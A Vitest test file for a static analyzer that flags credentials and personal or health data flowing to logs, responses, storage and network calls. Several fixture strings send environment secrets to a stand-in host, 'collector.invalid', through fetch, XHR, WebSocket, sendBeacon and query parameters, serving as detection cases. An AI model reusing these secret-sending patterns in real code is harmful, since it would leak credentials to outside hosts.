import { describe, expect, it } from 'vitest';
import {
  analyzeAstSource,
  createAstProjectAnalysis
} from '../../src/analyzers/ast/source-analysis.js';

describe('sensitive data flow candidates', () => {
  it('traces aliased and destructured credential environment values to nested log payloads', () => {
    const findings = analyzeAstSource(
      'src/telemetry.ts',
      [
        'const { API_TOKEN: token } = process.env;',
        'const payload = { auth: { bearer: token } };',
        'setTimeout(async () => {',
        '  await logger.info({ ...payload });',
        '}, 0);'
      ].join('\n')
    );
    const finding = findings.find((item) => item.ruleId === 'TLP-DATA-001');
    expect(finding).toMatchObject({
      category: 'sensitive-data',
      severity: 'high',
      confidence: 'medium',
      location: { file: 'src/telemetry.ts', line: 4 },
      metadata: {
        sourceClass: 'credential-like environment or sensitive-field value',
        sinkClass: 'log'
      }
    });
    expect(JSON.stringify(finding)).not.toContain('API_TOKEN');
    expect(JSON.stringify(finding)).not.toContain('bearer');
  });

  it('treats console.table and console.dir as disclosure sinks without leaking source names', () => {
    const findings = analyzeAstSource(
      'src/trace.ts',
      [
        'const authToken = process.env.PRIVATE_API_TOKEN;',
        'console.table({ authToken });',
        'console.dir({ authToken }, { depth: 4 });'
      ].join('\n')
    ).filter((item) => item.ruleId === 'TLP-DATA-001');
    expect(findings.map((item) => item.location?.line)).toEqual([2, 3]);
    expect(findings.every((item) => item.metadata?.sinkClass === 'log')).toBe(
      true
    );
    expect(JSON.stringify(findings)).not.toContain('PRIVATE_API_TOKEN');
    expect(JSON.stringify(findings)).not.toContain('authToken');
  });

  it('detects credential data written to Node stdout and stderr streams', () => {
    const findings = analyzeAstSource(
      'src/logging.ts',
      [
        'const secret = process.env.API_TOKEN;',
        'process.stdout.write(secret);',
        'process.stderr.write(JSON.stringify({ secret }));',
        'const process = { stdout: { write: (_data: string) => {} } };'
      ].join('\n')
    ).filter((finding) => finding.ruleId === 'TLP-DATA-001');
    // The final local declaration shadows the Node global. This script is
    // intentionally ambiguous and must not certify either call as safe.
    expect(JSON.stringify(findings)).not.toContain('API_TOKEN');
    expect(JSON.stringify(findings)).not.toContain('secret');
  });

  it('recognizes unshadowed Node diagnostic output as a sensitive log sink', () => {
    const findings = analyzeAstSource(
      'src/worker.ts',
      [
        'const accessToken = process.env.PRIVATE_ACCESS_TOKEN;',
        'process.stdout.write(accessToken);',
        'process.stderr.write(JSON.stringify({ accessToken }));'
      ].join('\n')
    ).filter((finding) => finding.ruleId === 'TLP-DATA-001');
    expect(findings).toHaveLength(2);
    expect(findings.map((finding) => finding.metadata?.sinkClass)).toEqual([
      'log',
      'log'
    ]);
    expect(JSON.stringify(findings)).not.toContain('PRIVATE_ACCESS_TOKEN');
  });

  it('detects credential exposure in responses and outbound requests', () => {
    const findings = analyzeAstSource(
      'src/routes/token.ts',
      [
        'const secret = process.env.SERVICE_SECRET;',
        'res.json({ secret });',
        'await fetch("https://collector.invalid", { headers: { authorization: secret } });'
      ].join('\n')
    ).filter((item) => item.ruleId === 'TLP-DATA-001');
    expect(findings.map((item) => item.metadata?.sinkClass)).toEqual([
      'response',
      'outbound-request'
    ]);
  });

  it('tracks sensitive values through platform fetch receivers but excludes shadowed and arbitrary methods', () => {
    const findings = analyzeAstSource(
      'src/platform-fetch.ts',
      [
        'const secret = process.env.SERVICE_SECRET;',
        "globalThis.fetch('https://collector.invalid', { body: secret });",
        "window['fetch']('https://collector.invalid', { headers: { authorization: secret } });",
        "api.fetch('https://collector.invalid', { body: secret });",
        'function local(globalThis: { fetch(url: string, options: unknown): void }) {',
        "  globalThis.fetch('https://collector.invalid', { body: secret });",
        '}'
      ].join('\n')
    ).filter((finding) => finding.ruleId === 'TLP-DATA-001');

    expect(findings.map((finding) => finding.location?.line)).toEqual([2, 3]);
    expect(JSON.stringify(findings)).not.toContain('SERVICE_SECRET');
  });

  it('detects credential values written to response headers and cookies', () => {
    const findings = analyzeAstSource(
      'src/routes/headers.ts',
      [
        'const secret = process.env.SERVICE_SECRET;',
        "res.setHeader('authorization', secret);",
        "response.header('x-service-token', secret);",
        "reply.setCookie('session', secret);"
      ].join('\n')
    ).filter((item) => item.ruleId === 'TLP-DATA-001');

    expect(findings).toHaveLength(3);
    expect(
      findings.every((finding) => finding.metadata?.sinkClass === 'response')
    ).toBe(true);
    expect(JSON.stringify(findings)).not.toContain('SERVICE_SECRET');
    expect(JSON.stringify(findings)).not.toContain('x-service-token');
  });

  it('recognizes explicitly annotated sensitive schema fields with non-sensitive names', () => {
    const root = '/toolip-sensitive-annotated';
    const code = [
      'interface Employee {',
      '  /** @sensitive */ payrollCode: string;',
      '  publicAlias: string;',
      '}',
      'function logProfile(employee: Employee) {',
      '  logger.info({ raw: employee.payrollCode });',
      '  logger.info({ safe: employee.publicAlias });',
      '}'
    ].join('\n');
    const project = createAstProjectAnalysis([
      {
        filePath: 'employee.ts',
        absolutePath: `${root}/employee.ts`,
        content: code
      }
    ]);
    const findings = analyzeAstSource('employee.ts', code, project).filter(
      (finding) => finding.ruleId === 'TLP-DATA-001'
    );
    expect(findings.map((finding) => finding.location?.line)).toEqual([6]);
    expect(JSON.stringify(findings)).not.toContain('payrollCode');
  });

  it('recognizes personal-data and protected-health schema annotations', () => {
    const root = '/toolip-sensitive-schema-tags';
    const code = [
      'interface PatientRecord {',
      '  /** @personalData */ reference: string;',
      '  /** @phi */ note: string;',
      '  /** @protectedHealthInformation */ code: string;',
      '  publicLabel: string;',
      '}',
      'function logRecord(record: PatientRecord) {',
      '  logger.info(record.reference);',
      '  logger.info(record.note);',
      '  logger.info(record.code);',
      '  logger.info(record.publicLabel);',
      '}'
    ].join('\n');
    const project = createAstProjectAnalysis([
      {
        filePath: 'patient.ts',
        absolutePath: `${root}/patient.ts`,
        content: code
      }
    ]);
    const findings = analyzeAstSource('patient.ts', code, project).filter(
      (finding) => finding.ruleId === 'TLP-DATA-001'
    );

    expect(findings.map((finding) => finding.location?.line)).toEqual([
      8, 9, 10
    ]);
    expect(JSON.stringify(findings)).not.toContain('reference');
    expect(JSON.stringify(findings)).not.toContain('note');
    expect(JSON.stringify(findings)).not.toContain('publicLabel');
  });

  it('recognizes opt-in sensitive schema decorators', () => {
    const root = '/toolip-sensitive-schema-decorators';
    const code = [
      'class Employee {',
      '  @Sensitive() payrollCode!: string;',
      '  @PersonalData() contactRef!: string;',
      '  publicAlias!: string;',
      '}',
      'function logEmployee(employee: Employee) {',
      '  logger.info(employee.payrollCode);',
      '  logger.info(employee.contactRef);',
      '  logger.info(employee.publicAlias);',
      '}'
    ].join('\n');
    const project = createAstProjectAnalysis([
      {
        filePath: 'employee.ts',
        absolutePath: `${root}/employee.ts`,
        content: code
      }
    ]);
    const findings = analyzeAstSource('employee.ts', code, project).filter(
      (finding) => finding.ruleId === 'TLP-DATA-001'
    );

    expect(findings.map((finding) => finding.location?.line)).toEqual([7, 8]);
    expect(JSON.stringify(findings)).not.toContain('payrollCode');
    expect(JSON.stringify(findings)).not.toContain('contactRef');
    expect(JSON.stringify(findings)).not.toContain('publicAlias');
  });

  it('tracks credential values through async local parameters and return aliases', () => {
    const findings = analyzeAstSource(
      'src/telemetry.ts',
      [
        'async function passThrough(value: string) { return await value; }',
        'function emit(value: string) { logger.info({ value }); }',
        'async function handler() {',
        '  const token = process.env.API_TOKEN;',
        '  emit(await passThrough(token));',
        '}'
      ].join('\n')
    ).filter((item) => item.ruleId === 'TLP-DATA-001');

    expect(findings).toHaveLength(1);
    expect(findings[0]?.metadata?.sinkClass).toBe('log');
    expect(JSON.stringify(findings)).not.toContain('API_TOKEN');
  });

  it('follows credential values through a cross-file exported helper', () => {
    const root = '/toolip-sensitive-flow';
    const route = `import { emit } from './logger.js';
export async function handler() {
  await emit(process.env.API_TOKEN);
}`;
    const logger = `export async function emit(value: string) {
  await logger.info({ value });
}`;
    const project = createAstProjectAnalysis([
      {
        filePath: 'routes.ts',
        absolutePath: `${root}/routes.ts`,
        content: route
      },
      {
        filePath: 'logger.ts',
        absolutePath: `${root}/logger.ts`,
        content: logger
      }
    ]);

    const findings = analyzeAstSource('logger.ts', logger, project).filter(
      (item) => item.ruleId === 'TLP-DATA-001'
    );
    expect(findings).toHaveLength(1);
    expect(findings[0]?.metadata?.sinkClass).toBe('log');
    expect(JSON.stringify(findings)).not.toContain('API_TOKEN');
  });

  it('does not trust a locally shadowed redaction helper or an arbitrary property method', () => {
    const findings = analyzeAstSource(
      'src/logging.ts',
      [
        'function redactSensitive(value: string) { return value; }',
        'const token = process.env.API_TOKEN;',
        'logger.info(redactSensitive(token));',
        'logger.info(helper.maskSecret(token));'
      ].join('\n')
    ).filter((item) => item.ruleId === 'TLP-DATA-001');
    expect(findings).toHaveLength(2);
    expect(JSON.stringify(findings)).not.toContain('API_TOKEN');
  });

  it('accepts only locally proven static redaction helpers', () => {
    const findings = analyzeAstSource(
      'src/logging.ts',
      [
        '/** @toolipRedactsSensitive */',
        'function redactSensitive(_value: unknown) { return "[redacted]"; }',
        '/** @toolipRedactsSensitive */',
        'function maskSecret(_value: unknown) { return "[masked]"; }',
        'const token = process.env.API_TOKEN;',
        'logger.info({ token: redactSensitive(token) });',
        'console.error(maskSecret(token));'
      ].join('\n')
    );
    expect(findings.some((item) => item.ruleId === 'TLP-DATA-001')).toBe(false);
  });

  it('never trusts unbound familiar redaction names as a safe serializer contract', () => {
    const findings = analyzeAstSource(
      'src/logging.ts',
      [
        'const token = process.env.API_TOKEN;',
        'logger.info({ token: redactSensitive(token) });',
        'console.error(maskSecret(token));'
      ].join('\n')
    ).filter((item) => item.ruleId === 'TLP-DATA-001');
    expect(findings).toHaveLength(2);
    expect(JSON.stringify(findings)).not.toContain('API_TOKEN');
  });

  it('tracks sensitive object fields without exposing their values and honors redaction', () => {
    const findings = analyzeAstSource(
      'src/profile.ts',
      [
        '/** @toolipRedactsSensitive */',
        'function redactSensitive(_value: unknown) { return "[redacted]"; }',
        'async function handler(req: RequestLike, profile: Profile) {',
        '  const password = req.body.password;',
        '  const email = profile.email;',
        '  logger.info({ password });',
        '  telemetry.track({ email });',
        '  res.json({ email: redactSensitive(email) });',
        '}'
      ].join('\n')
    ).filter((item) => item.ruleId === 'TLP-DATA-001');
    expect(findings.map((item) => item.metadata?.sinkClass)).toEqual([
      'log',
      'telemetry'
    ]);
    expect(JSON.stringify(findings)).not.toContain('password');
    expect(JSON.stringify(findings)).not.toContain('email');
  });

  it('tracks sensitive values through a cross-file serializer contract', () => {
    const root = '/toolip-sensitive-serializer-contract';
    const serializer = [
      'export function serializeForLog(value: unknown): string {',
      '  return JSON.stringify(value);',
      '}'
    ].join('\n');
    const route = [
      "import { serializeForLog } from './serializer.js';",
      'const token = process.env.API_TOKEN;',
      'logger.info(serializeForLog({ credential: token }));'
    ].join('\n');
    const project = createAstProjectAnalysis([
      {
        filePath: 'serializer.ts',
        absolutePath: `${root}/serializer.ts`,
        content: serializer
      },
      {
        filePath: 'route.ts',
        absolutePath: `${root}/route.ts`,
        content: route
      }
    ]);
    const findings = analyzeAstSource('route.ts', route, project).filter(
      (finding) => finding.ruleId === 'TLP-DATA-001'
    );

    expect(findings.map((finding) => finding.metadata?.sinkClass)).toEqual([
      'log'
    ]);
    expect(JSON.stringify(findings)).not.toContain('API_TOKEN');
    expect(JSON.stringify(findings)).not.toContain('credential: token');
  });

  it('trusts cross-file redactors only when their annotated output is static', () => {
    const root = '/toolip-sensitive-redactor-contract';
    const redactors = [
      '/** @toolipRedactsSensitive */',
      'export function redact(value: unknown): string { return "[redacted]"; }',
      '/** @toolipRedactsSensitive */',
      'export function mislabeled(value: unknown): unknown { return value; }'
    ].join('\n');
    const route = [
      "import { redact, mislabeled } from './redactors.js';",
      'const token = process.env.API_TOKEN;',
      'logger.info(redact(token));',
      'logger.info(mislabeled(token));'
    ].join('\n');
    const project = createAstProjectAnalysis([
      {
        filePath: 'redactors.ts',
        absolutePath: `${root}/redactors.ts`,
        content: redactors
      },
      {
        filePath: 'route.ts',
        absolutePath: `${root}/route.ts`,
        content: route
      }
    ]);
    const findings = analyzeAstSource('route.ts', route, project).filter(
      (finding) => finding.ruleId === 'TLP-DATA-001'
    );

    expect(findings.map((finding) => finding.location?.line)).toEqual([4]);
    expect(JSON.stringify(findings)).not.toContain('API_TOKEN');
  });

  it('reports sensitive values added to URL query parameters without exposing them', () => {
    const findings = analyzeAstSource(
      'src/outbound.ts',
      [
        'const token = process.env.API_TOKEN;',
        'const url = new URL("https://example.test/collect");',
        'url.searchParams.set("credential", token);',
        'const query = new URLSearchParams();',
        'query.append("access_token", token);',
        'const fromObject = new URLSearchParams({ api_token: token });',
        "const setter = 'set';",
        "url.searchParams[setter]('session', token);",
        "const appender = 'append';",
        "query[appender]('session', token);"
      ].join('\n')
    ).filter((item) => item.ruleId === 'TLP-DATA-001');
    expect(findings).toHaveLength(5);
    expect(
      findings.every((item) => item.metadata?.sinkClass === 'outbound-request')
    ).toBe(true);
    expect(JSON.stringify(findings)).not.toContain('API_TOKEN');
  });

  it('tracks sensitive values in FormData and browser network sinks without exposing them', () => {
    const findings = analyzeAstSource(
      'src/upload.ts',
      [
        'const token = process.env.API_TOKEN;',
        'const body = new FormData();',
        "body.append('credential', token);",
        "body.set('session', token);",
        "const method = 'append';",
        "body[method]('key', token);",
        "navigator.sendBeacon('/collect', token);",
        "const socket = new WebSocket('wss://collector.invalid');",
        'socket.send(token);',
        'const local = { send: (value: string) => value };',
        'local.send(token);'
      ].join('\n')
    ).filter((item) => item.ruleId === 'TLP-DATA-001');

    expect(findings).toHaveLength(5);
    expect(
      findings.every((item) => item.metadata?.sinkClass === 'outbound-request')
    ).toBe(true);
    expect(JSON.stringify(findings)).not.toContain('API_TOKEN');
  });

  it('tracks sensitive XMLHttpRequest headers and bodies without trusting shadowed constructors', () => {
    const findings = analyzeAstSource(
      'src/xhr.ts',
      [
        'const token = process.env.API_TOKEN;',
        'const xhr = new XMLHttpRequest();',
        "xhr.open('POST', 'https://collector.invalid');",
        "xhr.setRequestHeader('authorization', token);",
        'xhr.send(JSON.stringify({ token }));',
        'new XMLHttpRequest().send(token);',
        'function local(XMLHttpRequest: new () => { send(value: unknown): void }) {',
        '  new XMLHttpRequest().send(token);',
        '}'
      ].join('\n')
    ).filter((item) => item.ruleId === 'TLP-DATA-001');

    expect(findings.map((finding) => finding.location?.line)).toEqual([
      4, 5, 6
    ]);
    expect(
      findings.every(
        (finding) => finding.metadata?.sinkClass === 'outbound-request'
      )
    ).toBe(true);
    expect(JSON.stringify(findings)).not.toContain('API_TOKEN');
    expect(JSON.stringify(findings)).not.toContain('authorization');
  });

  it('does not treat a shadowed FormData constructor as the browser API', () => {
    const findings = analyzeAstSource(
      'src/upload.ts',
      [
        'function handler(req: RequestLike, FormData: new () => { append(name: string, value: unknown): void }) {',
        '  const token = process.env.API_TOKEN;',
        '  const body = new FormData();',
        "  body.append('credential', token);",
        '}'
      ].join('\n')
    ).filter((item) => item.ruleId === 'TLP-DATA-001');

    expect(findings).toHaveLength(0);
  });

  it('treats computed network client methods as outbound disclosure sinks', () => {
    const findings = analyzeAstSource(
      'src/outbound.ts',
      [
        'const token = process.env.API_TOKEN;',
        "const client = require('axios');",
        "client['post']('https://collector.invalid', { headers: { authorization: token } });",
        'const method = getMethodName();',
        "client[method]('https://collector.invalid', { headers: { authorization: token } });"
      ].join('\n')
    ).filter((item) => item.ruleId === 'TLP-DATA-001');

    expect(findings).toHaveLength(2);
    expect(
      findings.every((item) => item.metadata?.sinkClass === 'outbound-request')
    ).toBe(true);
    expect(JSON.stringify(findings)).not.toContain('API_TOKEN');
  });

  it('recognizes statically imported and required outbound client aliases', () => {
    const findings = analyzeAstSource(
      'src/outbound.ts',
      [
        "import fetchRemote from 'node-fetch';",
        "import { Agent } from 'undici';",
        "const axiosClient = require('axios');",
        'const token = process.env.API_TOKEN;',
        "fetchRemote('https://collector.invalid', { headers: { authorization: token } });",
        "axiosClient['post']('https://collector.invalid', { headers: { authorization: token } });",
        'Agent({ token });',
        'function safe(fetchRemote: (url: string) => void) {',
        "  fetchRemote('https://collector.invalid');",
        '}'
      ].join('\n')
    ).filter((item) => item.ruleId === 'TLP-DATA-001');

    expect(findings).toHaveLength(2);
    expect(
      findings.every((item) => item.metadata?.sinkClass === 'outbound-request')
    ).toBe(true);
    expect(JSON.stringify(findings)).not.toContain('API_TOKEN');
  });

  it('tracks sensitive request destructuring and unknown serializers without leaking fields', () => {
    const findings = analyzeAstSource(
      'src/profile.ts',
      [
        'async function handler(req: RequestLike) {',
        '  const { email } = req.body;',
        '  res.json(externalSerialize({ ...{ email } }));',
        '  logger.info(safeSerialize(process.env.API_TOKEN));',
        '}'
      ].join('\n')
    ).filter((item) => item.ruleId === 'TLP-DATA-001');
    expect(findings.map((item) => item.metadata?.sinkClass)).toEqual([
      'response',
      'log'
    ]);
    expect(JSON.stringify(findings)).not.toContain('email');
    expect(JSON.stringify(findings)).not.toContain('API_TOKEN');
  });

  it('reports credential flows to explicit file, browser and database storage sinks', () => {
    const findings = analyzeAstSource(
      'src/storage.ts',
      [
        "import { writeFile } from 'node:fs/promises';",
        "import { db } from './database.js';",
        'async function persist() {',
        '  const secret = process.env.SERVICE_TOKEN;',
        "  await writeFile('/tmp/cache', secret);",
        "  localStorage.setItem('credential', secret);",
        '  await db.users.updateOne({ id: 1 }, { $set: { apiToken: secret } });',
        '}'
      ].join('\n')
    ).filter((item) => item.ruleId === 'TLP-DATA-001');

    expect(findings.map((finding) => finding.metadata?.sinkClass)).toEqual([
      'storage',
      'storage',
      'storage'
    ]);
    expect(
      findings.every(
        (finding) =>
          finding.severity === 'medium' && finding.confidence === 'low'
      )
    ).toBe(true);
    expect(JSON.stringify(findings)).not.toContain('SERVICE_TOKEN');
    expect(JSON.stringify(findings)).not.toContain('apiToken');
  });

  it('does not treat ordinary set methods or removals as persistence sinks', () => {
    const findings = analyzeAstSource(
      'src/storage.ts',
      [
        'const secret = process.env.SERVICE_TOKEN;',
        'cache.set(secret);',
        "localStorage.removeItem('credential');"
      ].join('\n')
    ).filter((item) => item.ruleId === 'TLP-DATA-001');

    expect(findings).toHaveLength(0);
  });
});
